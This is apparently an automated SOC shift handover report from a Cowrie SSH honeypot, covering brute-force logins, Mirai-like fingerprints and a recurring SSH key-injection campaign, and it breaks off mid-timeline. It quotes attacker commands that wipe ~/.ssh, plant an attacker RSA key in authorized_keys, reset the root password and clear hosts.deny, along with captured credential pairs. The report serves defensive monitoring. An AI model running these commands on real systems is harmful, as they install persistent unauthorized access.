# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-01 |
| **Generated At** | 2026-04-01T10:53:36Z |
| **Shift Time** | 10:53 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **73** |
| Confirmed Threats | **68** |
| False Positives Filtered | **5** (6.9%) |
| Unique Attacker IPs | **36** |
| Countries of Origin | **17** |
| High Severity Cases | **23** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **50** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **53** |
| Unique Credential Pairs | **39** |
| Unique Usernames | **21** |
| Unique Passwords | **36** |
| Successful Auth Pairs | **18** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 24 |
| `345gs5662d34` | 8 |
| `Admin` | 2 |
| `admin` | 2 |
| `claude` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 8 |
| `1qaz2wsx` | 2 |
| `123456` | 2 |
| `1234567` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `root` | `3245gs5662d34` | 8 |
| `claude` | `claude123` | 1 |
| `root` | `asdfghjLd` | 1 |
| `root` | `12345` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `asdfghjLd` | `103.63.25.203` | 2026-04-01T09:06:10 |
| `root` | `3245gs5662d34` | `103.63.25.203` | 2026-04-01T09:06:14 |
| `root` | `12345` | `172.210.53.227` | 2026-04-01T09:07:33 |
| `root` | `1q@W#E$R` | `103.63.25.203` | 2026-04-01T09:10:47 |
| `root` | `qaws` | `120.62.8.17` | 2026-04-01T09:10:50 |
| `root` | `3245gs5662d34` | `120.62.8.17` | 2026-04-01T09:10:51 |
| `root` | `2025@Root` | `103.63.25.203` | 2026-04-01T09:15:20 |
| `root` | `Abc123456` | `103.63.25.203` | 2026-04-01T09:19:55 |
| `root` | `changxin5202614` | `103.63.25.203` | 2026-04-01T09:24:51 |
| `root` | `Qwe123!@#` | `103.63.25.203` | 2026-04-01T09:29:26 |
| `root` | `1234567` | `172.210.53.227` | 2026-04-01T09:34:42 |
| `root` | `12345678` | `172.210.53.227` | 2026-04-01T09:48:21 |
| `root` | `qwe#12` | `106.58.173.254` | 2026-04-01T10:00:39 |
| `root` | `P@$$W0RD1` | `103.103.245.7` | 2026-04-01T10:01:24 |
| `root` | `3245gs5662d34` | `103.103.245.7` | 2026-04-01T10:01:29 |
| `root` | `root123` | `172.210.53.227` | 2026-04-01T10:29:33 |
| `root` | `root@123` | `172.210.53.227` | 2026-04-01T10:43:20 |
| `root` | `P` | `101.43.79.210` | 2026-04-01T10:47:16 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **73** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 34 |
| OpenSSH | 19 |
| Go SSH scanner | 6 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 31 | 4 |
| `acaa53e0a7d7...` | Mirai/variant | 19 | 19 |
| `16443846184e...` | Generic scanner | 6 | 1 |
| `19532158b559...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 31 | 4 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 19 | 19 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 6 | 1 | Generic scanner |
| `19532158b559...` | libssh | 3 | 1 | Mirai/variant |
| `95420f9d932d...` | Unknown | 2 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:r60OXb50vesq"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `106.58.173.254`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.62.8.17`, `103.63.25.203`, `103.103.245.7`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **36** |
| Unique ASNs | **28** |
| High-Risk ASNs | **25** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS12479` | Orange Espagne SA | 1 | HIGH |
| `AS11427` | Charter Communications Inc | 1 | MEDIUM |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (23)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-40903969a8a6

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 09:06 |
| **Last Seen** | 2026-04-01 09:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:06:09` | `cowrie.session.connect` |
| `2026-04-01 09:06:09` | `cowrie.client.version` |
| `2026-04-01 09:06:09` | `cowrie.client.kex` |
| `2026-04-01 09:06:10` | `cowrie.login.success` |
| `2026-04-01 09:06:10` | `cowrie.session.params` |
| `2026-04-01 09:06:10` | `cowrie.command.input` |
| `2026-04-01 09:06:10` | `cowrie.command.failed` |
| `2026-04-01 09:06:11` | `cowrie.log.closed` |
| `2026-04-01 09:06:11` | `cowrie.session.params` |
| `2026-04-01 09:06:11` | `cowrie.command.input` |
| `2026-04-01 09:06:11` | `cowrie.session.file_download` |
| `2026-04-01 09:06:11` | `cowrie.log.closed` |
| `2026-04-01 09:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3a5ac6fd295

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 09:06 |
| **Last Seen** | 2026-04-01 09:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:06:13` | `cowrie.session.connect` |
| `2026-04-01 09:06:13` | `cowrie.client.version` |
| `2026-04-01 09:06:14` | `cowrie.client.kex` |
| `2026-04-01 09:06:14` | `cowrie.login.success` |
| `2026-04-01 09:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8744814523d1

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]227` |
| **First Seen** | 2026-04-01 09:07 |
| **Last Seen** | 2026-04-01 09:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:07:32` | `cowrie.session.connect` |
| `2026-04-01 09:07:32` | `cowrie.client.version` |
| `2026-04-01 09:07:32` | `cowrie.client.kex` |
| `2026-04-01 09:07:33` | `cowrie.login.success` |
| `2026-04-01 09:07:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]227` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-149b5b2d57a9

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 09:10 |
| **Last Seen** | 2026-04-01 09:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:10:46` | `cowrie.session.connect` |
| `2026-04-01 09:10:46` | `cowrie.client.version` |
| `2026-04-01 09:10:46` | `cowrie.client.kex` |
| `2026-04-01 09:10:47` | `cowrie.login.success` |
| `2026-04-01 09:10:47` | `cowrie.session.params` |
| `2026-04-01 09:10:47` | `cowrie.command.input` |
| `2026-04-01 09:10:47` | `cowrie.command.failed` |
| `2026-04-01 09:10:47` | `cowrie.log.closed` |
| `2026-04-01 09:10:48` | `cowrie.session.params` |
| `2026-04-01 09:10:48` | `cowrie.command.input` |
| `2026-04-01 09:10:48` | `cowrie.session.file_download` |
| `2026-04-01 09:10:48` | `cowrie.log.closed` |
| `2026-04-01 09:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fcd47b8a0d6

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-01 09:10 |
| **Last Seen** | 2026-04-01 09:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:10:49` | `cowrie.session.connect` |
| `2026-04-01 09:10:49` | `cowrie.client.version` |
| `2026-04-01 09:10:49` | `cowrie.client.kex` |
| `2026-04-01 09:10:50` | `cowrie.login.success` |
| `2026-04-01 09:10:50` | `cowrie.session.params` |
| `2026-04-01 09:10:50` | `cowrie.command.input` |
| `2026-04-01 09:10:50` | `cowrie.command.failed` |
| `2026-04-01 09:10:50` | `cowrie.log.closed` |
| `2026-04-01 09:10:50` | `cowrie.session.params` |
| `2026-04-01 09:10:50` | `cowrie.command.input` |
| `2026-04-01 09:10:50` | `cowrie.session.file_download` |
| `2026-04-01 09:10:50` | `cowrie.log.closed` |
| `2026-04-01 09:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5044c38d48a6

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 09:10 |
| **Last Seen** | 2026-04-01 09:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:10:50` | `cowrie.session.connect` |
| `2026-04-01 09:10:50` | `cowrie.client.version` |
| `2026-04-01 09:10:50` | `cowrie.client.kex` |
| `2026-04-01 09:10:51` | `cowrie.login.success` |
| `2026-04-01 09:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-139295847db0

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-01 09:10 |
| **Last Seen** | 2026-04-01 09:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:10:51` | `cowrie.session.connect` |
| `2026-04-01 09:10:51` | `cowrie.client.version` |
| `2026-04-01 09:10:51` | `cowrie.client.kex` |
| `2026-04-01 09:10:51` | `cowrie.login.success` |
| `2026-04-01 09:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6535f0f0767

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 09:15 |
| **Last Seen** | 2026-04-01 09:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:15:19` | `cowrie.session.connect` |
| `2026-04-01 09:15:19` | `cowrie.client.version` |
| `2026-04-01 09:15:19` | `cowrie.client.kex` |
| `2026-04-01 09:15:20` | `cowrie.login.success` |
| `2026-04-01 09:15:20` | `cowrie.session.params` |
| `2026-04-01 09:15:20` | `cowrie.command.input` |
| `2026-04-01 09:15:20` | `cowrie.command.failed` |
| `2026-04-01 09:15:20` | `cowrie.log.closed` |
| `2026-04-01 09:15:21` | `cowrie.session.params` |
| `2026-04-01 09:15:21` | `cowrie.command.input` |
| `2026-04-01 09:15:21` | `cowrie.session.file_download` |
| `2026-04-01 09:15:21` | `cowrie.log.closed` |
| `2026-04-01 09:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be481da41703

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 09:15 |
| **Last Seen** | 2026-04-01 09:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:15:23` | `cowrie.session.connect` |
| `2026-04-01 09:15:23` | `cowrie.client.version` |
| `2026-04-01 09:15:23` | `cowrie.client.kex` |
| `2026-04-01 09:15:24` | `cowrie.login.success` |
| `2026-04-01 09:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93a15df226a3

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 09:19 |
| **Last Seen** | 2026-04-01 09:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:19:54` | `cowrie.session.connect` |
| `2026-04-01 09:19:54` | `cowrie.client.version` |
| `2026-04-01 09:19:54` | `cowrie.client.kex` |
| `2026-04-01 09:19:55` | `cowrie.login.success` |
| `2026-04-01 09:19:56` | `cowrie.session.params` |
| `2026-04-01 09:19:56` | `cowrie.command.input` |
| `2026-04-01 09:19:56` | `cowrie.command.failed` |
| `2026-04-01 09:19:56` | `cowrie.log.closed` |
| `2026-04-01 09:19:56` | `cowrie.session.params` |
| `2026-04-01 09:19:56` | `cowrie.command.input` |
| `2026-04-01 09:19:56` | `cowrie.session.file_download` |
| `2026-04-01 09:19:56` | `cowrie.log.closed` |
| `2026-04-01 09:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9fbd9ebbb86

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 09:19 |
| **Last Seen** | 2026-04-01 09:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:19:59` | `cowrie.session.connect` |
| `2026-04-01 09:19:59` | `cowrie.client.version` |
| `2026-04-01 09:19:59` | `cowrie.client.kex` |
| `2026-04-01 09:20:00` | `cowrie.login.success` |
| `2026-04-01 09:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3b897d20e5a

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 09:24 |
| **Last Seen** | 2026-04-01 09:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:24:50` | `cowrie.session.connect` |
| `2026-04-01 09:24:50` | `cowrie.client.version` |
| `2026-04-01 09:24:50` | `cowrie.client.kex` |
| `2026-04-01 09:24:51` | `cowrie.login.success` |
| `2026-04-01 09:24:51` | `cowrie.session.params` |
| `2026-04-01 09:24:51` | `cowrie.command.input` |
| `2026-04-01 09:24:51` | `cowrie.command.failed` |
| `2026-04-01 09:24:51` | `cowrie.log.closed` |
| `2026-04-01 09:24:52` | `cowrie.session.params` |
| `2026-04-01 09:24:52` | `cowrie.command.input` |
| `2026-04-01 09:24:52` | `cowrie.session.file_download` |
| `2026-04-01 09:24:52` | `cowrie.log.closed` |
| `2026-04-01 09:24:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4138fc364c6c

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]203` |
| **First Seen** | 2026-04-01 09:24 |
| **Last Seen** | 2026-04-01 09:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-01 09:24:54` | `cowrie.session.connect` |
| `2026-04-01 09:24:54` | `cowrie.client.version` |
| `2026-04-01 09:24:54` | `cowrie.client.kex` |
